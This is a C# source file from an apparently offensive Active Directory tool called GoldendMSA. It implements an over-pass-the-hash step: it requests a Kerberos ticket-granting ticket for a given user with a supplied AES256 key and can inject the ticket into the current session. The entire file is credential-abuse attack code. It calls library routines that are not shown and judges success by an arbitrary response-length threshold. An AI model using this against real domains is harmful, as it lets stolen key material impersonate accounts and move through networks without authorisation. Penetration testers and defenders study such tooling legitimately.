using System;
using GoldendMSA.lib;

namespace GoldendMSA
{
    public class OverPassTheHash
    {
        public static int Over_pass_the_hash(string username, string domainName, string aes256, bool ptt, bool verbose)
        {
            var encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            var suppEncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;

            try
            {
                var response = Ask.Tgt(username, domainName, aes256, encType, ptt, suppEncType, verbose);
                if (response.Length > 300) // random number that I chose to check if there is a ticket
                    return 1;
            }
            catch (KRB_ERROR ex)
            {
                if (verbose)
                    try
                    {
                        Console.WriteLine("[X] ERROR : {0}: {1}", (Interop.KERBEROS_ERROR)ex.error_code, ex.e_text);
                    }
                    catch
                    {
                        Console.WriteLine("[X] ERROR : {0}", (Interop.KERBEROS_ERROR)ex.error_code);
                    }
            }

            return 0;
        }
    }
}